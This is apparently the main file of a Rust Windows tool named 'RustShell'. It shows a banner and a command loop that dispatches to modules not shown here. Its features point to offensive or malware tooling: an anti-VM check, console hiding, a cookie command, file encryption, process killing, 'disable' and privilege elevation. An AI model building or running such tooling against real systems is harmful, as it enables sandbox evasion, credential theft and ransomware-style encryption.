#![allow(non_snake_case)]

use std::io::{self, Write, stdout};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::um::wincon::SetConsoleTitleW;
use colored::*;
use rand::{rngs::OsRng, RngCore};

mod hide_window;
mod functions;
mod antivm;

fn main() -> Result<(), anyhow::Error> {
    // hides the cmd window
    // hide_window::hide_console_window();

    // Set the cmd window title
    let new_title = "RustShell";
    let title: Vec<u16> = OsStr::new(new_title)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();
    unsafe { 
        SetConsoleTitleW(title.as_ptr()) 
    };

    // Checks if the program is running in a VM
    antivm::antivm();

    let mut key = [0u8; 32];
    let mut nonce = [0u8; 19];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut nonce);

    ansi_term::enable_ansi_support().unwrap();

    // Clear the command prompt
    print!("{}[2J", 27 as char);
    stdout().flush().unwrap();

    let lines = [
        "    /$$$$$$$                        /$$      /$$$$$$  /$$                 /$$ /$$ ",
        "   | $$__  $$                      | $$     /$$__  $$| $$                | $$| $$ ",
        "   | $$  \\ $$ /$$   /$$  /$$$$$$$ /$$$$$$  | $$  \\__/| $$$$$$$   /$$$$$$ | $$| $$ ",
        "   | $$$$$$$/| $$  | $$ /$$_____/|_  $$_/  |  $$$$$$ | $$__  $$ /$$__  $$| $$| $$ ",
        "   | $$__  $$| $$  | $$|  $$$$$$   | $$     \\____  $$| $$  \\ $$| $$$$$$$$| $$| $$ ",
        "   | $$  \\ $$| $$  | $$ \\____  $$  | $$ /$$ /$$  \\ $$| $$  | $$| $$_____/| $$| $$ ",
        "   | $$  | $$|  $$$$$$/ /$$$$$$$/  |  $$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$ ",
        "   |__/  |__/ \\______/ |_______/    \\___/   \\______/ |__/  |__/ \\_______/|__/|__/ ",
        "",
    ];

    for line in &lines {
        println!("{}", line.truecolor(80, 12, 170));
    }

    loop {
        print!("{}", "          > ".truecolor(120, 120, 120));

        io::stdout().flush()?;

        let mut input = String::new();
        io::stdin().read_line(&mut input)?;

        let input = input.trim();

        let mut parts = input.splitn(2, ' ');
        let command = parts.next().unwrap_or("");

        if input.is_empty() {
            // If the user didn't enter any input, print the prompt again and continue
            io::stdout().flush()?;
            continue;
        }
        
        match command {
            "exit" | "quit" => {
                break;
            }
            "rm" | "del" => {
                functions::remove();
            }
            "tree" => {
                functions::tree()
            }
            "clear" | "cls" => {
                print!("{}[2J", 27 as char);
                stdout().flush().unwrap();
                for line in &lines {
                    println!("{}", line.truecolor(80, 12, 170));
                }
            }
            "find" => {
                functions::find();
            }
            "where" => {
                functions::whereis();
            }
            "scan" => {
                functions::scan();
            }
            "cookies" => {
                //functions::cookies();
            }
            "encrypt" | "enc" => {
                functions::encrypt(
                    "500.bin",
                    "500.encrypted",
                    &key,
                    &nonce,
                )?;
            }
            "decrypt" | "dec" => {
                functions::decrypt(
                    "500.encrypted",
                    "500.decrypted",
                    &key,
                    &nonce,
                )?;
            }
            "help" => {
                functions::help();
            }
            "info" => {
                functions::info();
            }
            "kill" => {
                functions::kill();
            }
            "disable" => {
                functions::disable();
            }
            "elevate" => {
                functions::elevate();
            }
            _ => println!("{} Type '{}' for a list of commands.", "        Command not found.".truecolor(255, 0, 0), "help".truecolor(80, 0, 255)),
        }
    }
    Ok(())
}
